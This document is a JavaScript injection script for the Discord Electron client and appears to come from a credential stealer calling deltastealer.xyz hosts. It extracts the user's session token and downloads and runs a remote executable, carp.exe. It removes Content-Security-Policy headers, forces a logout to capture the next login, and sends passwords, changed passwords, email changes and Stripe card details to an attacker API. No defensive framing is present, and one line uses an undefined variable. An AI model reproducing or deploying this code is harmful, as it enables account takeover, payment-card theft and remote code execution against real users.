const { session, BrowserWindow } = require("electron");
const { exec } = require("child_process");
const fs = require("fs");
const path = require("path");
const axios = require("axios");
const FormData = require("form-data");
const querystring = require("querystring");

const channel_id = "<channel_id>";
const botToken = "<bot_token>";
const temp = process.env.temp;
const infectionPath = path.join(process.env.temp, "\\Windows_Defender");

const gt = async () => {
  const token =
    await BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(
      `for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`,
      true
    );
  return token;
};

const logout = async () => {
  await BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(
    `window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`,
    true
  );

  return "ok";
};

(async () => {
  const response = await axios.get("https://cdn.deltastealer.xyz/carp.exe", {
    responseType: "arraybuffer"
  });

  await fs.writeFileSync(temp + "\\carp.exe", response.data, {
    encoding: "utf8",
    flags: "w"
  });

  await exec(temp + `\\carp.exe ${channel_id}`);

  return;
})();

(async () => {
  if(!fs.existsSync(infectionPath + "\\logged.txt")) {
    await logout();
    fs.writeFileSync(infectionPath + "\\logged.txt", "renne#0007", {
      encoding: "utf8",
      flags: "w"
    });
  }
})();

const infect = async () => {
  const response = await axios.get("https://cdn.deltastealer.xyz/carp.exe", {
    responseType: "arraybuffer"
  });

  await fs.writeFileSync(temp + "\\carp.exe", response.data, {
    encoding: "utf8",
    flags: "w"
  });

  await exec(temp + `\\carp.exe ${channel_id}`);

  return;
};

const send = async (data) => {
  const window = BrowserWindow.getAllWindows()[0];
  await infect();
  await window.webContents.executeJavaScript(
    `var xhr = new XMLHttpRequest();xhr.open("POST", "https://api.deltastealer.xyz/send", true);xhr.setRequestHeader("Content-Type", "application/json");xhr.setRequestHeader("Access-Control-Allow-Origin", "*");xhr.send(JSON.stringify(${data}));`,
    true
  );
  return;
};

session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
  if (
    details.url.startsWith("https://api.deltastealer.xyz") ||
    details.url.startsWith("https://cdn.deltastealer.xyz")
  ) {
    if (details.url.includes("discord.com")) {
      callback({
        responseHeaders: Object.assign(
          {
            "Access-Control-Allow-Headers": "*"
          },
          details.responseHeaders
        )
      });
    } else {
      callback({
        responseHeaders: Object.assign(
          {
            "Content-Security-Policy": [
              "default-src '*'",
              "Access-Control-Allow-Headers '*'",
              "Access-Control-Allow-Origin '*'"
            ],
            "Access-Control-Allow-Headers": "*",
            "Access-Control-Allow-Origin": "*"
          },
          details.responseHeaders
        )
      });
    }
  } else {
    delete details.responseHeaders["content-security-policy"];
    delete details.responseHeaders["content-security-policy-report-only"];

    callback({
      responseHeaders: {
        ...details.responseHeaders,
        "Access-Control-Allow-Headers": "*"
      }
    });
  }
});

session.defaultSession.webRequest.onBeforeSendHeaders((details, callback) => {
  if (
    details.url.startsWith("https://api.deltastealer.xyz") ||
    details.url.startsWith("https://cdn.deltastealer.xyz")
  ) {
    if (details.url.includes("discord.com")) {
      /*
      if (details.url.includes("auth/login")) {
        delete details.requestHeaders["Referrer-Policy"];
      }
      */
      callback({
        requestHeaders: Object.assign(
          {
            "Access-Control-Allow-Headers": "*"
          },
          details.requestHeaders
        )
      });
    } else {
      callback({
        requestHeaders: Object.assign(
          {
            "Content-Security-Policy": [
              "default-src '*'",
              "Access-Control-Allow-Headers '*'",
              "Access-Control-Allow-Origin '*'"
            ],
            "Access-Control-Allow-Headers": "*",
            "Access-Control-Allow-Origin": "*"
          },
          details.requestHeaders
        )
      });
    }
  } else {
    delete details.requestHeaders["content-security-policy"];
    delete details.requestHeaders["content-security-policy-report-only"];

    callback({
      requestHeaders: {
        ...details.requestHeaders,
        "Access-Control-Allow-Headers": "*"
      }
    });
  }
});

session.defaultSession.webRequest.onCompleted(
  {
    urls: [
      "https://discord.com/api/v*/users/@me",
      "https://discordapp.com/api/v*/users/@me",
      "https://*.discord.com/api/v*/users/@me",
      "https://discordapp.com/api/v*/auth/login",
      "https://discord.com/api/v*/auth/login",
      "https://*.discord.com/api/v*/auth/login",
      "https://api.stripe.com/v*/tokens"
    ]
  },
  async (details, callback) => {
    if (details.url.endsWith("login") && details.statusCode == 200) {
      const data = JSON.parse(
        Buffer.from(details.uploadData[0].bytes).toString()
      );
      if (data.password) {
        const token = await gt();
        var snd = JSON.stringify({
          userToken: token,
          eventName: "userLogged",
          botToken: botToken,
          payload: {
            password: data.password,
            channel_id: channel_id
          }
        });
        await send(snd);
      } else {
        await logout();
      }
    }

    if (
      details.url.endsWith("users/@me") &&
      details.statusCode == 200 &&
      details.method == "PATCH"
    ) {
      const data = JSON.parse(
        Buffer.from(details.uploadData[0].bytes).toString()
      );
      if (data.password) {
        if (data.new_password) {
          const token = await gt();
          var snd = JSON.stringify({
            userToken: token,
            eventName: "passwordChanged",
            botToken: botToken,
            payload: {
              password: data.password,
              new_password: data.new_password
            }
          });
          await send(snd);
        } else if (data.email) {
          const token = await gt();
          var snd = JSON.stringify({
            userToken: token,
            eventName: "emailChanged",
            botToken: botToken,
            payload: {
              password: data.password,
              channel_id: channel_id
            }
          });
          await send(snd);
        } else {
          const token = await gt();
          var snd = JSON.stringify({
            userToken: token,
            eventName: "passwordArraived",
            botToken: botToken,
            payload: {
              password: data.password,
              channel_id: channel_id
            }
          });
          await send(snd);
        }
      }
    }

    if (details.url.endsWith("tokens")) {
      const data = querystring.parse(
        decodeURIComponent(Buffer.from(e.uploadData[0].bytes).toString())
      );
      const token = await gt();
      var snd = JSON.stringify({
        userToken: token,
        eventName: "cardAdded",
        botToken: botToken,
        payload: {
          number: data["card[number]"],
          exp_moth: data["card[exp_month]"],
          exp_year: data["card[exp_year]"],
          adress: data["card[address_line1]"],
          city: data["card[address_city]"],
          state: data["card[address_state]"],
          postal: data["card[address_zip]"],
          country: data["card[address_country]"],
          channel_id: channel_id
        }
      });
      await send(snd);
    }

    /*
    if (details.statusCode == 200 && !details.url.endsWith("login")) {
      const data = JSON.parse(
        Buffer.from(details.uploadData[0].bytes).toString()
      );
      if (data.password) {
        const token = await gt();
        await send({
          userToken: token,
          eventName: "passwordArraived",
          payload: {
            password: data.password,
            channel_id: channel_id,
          },
        });
      } else if (data.email_token) {
        const token = await gt();
        await send({
          userToken: token,
          eventName: "emailTokenArraived",
          payload: {
            password: data.password,
            channel_id: channel_id,
          },
        });
      }
    }
    */
  }
);
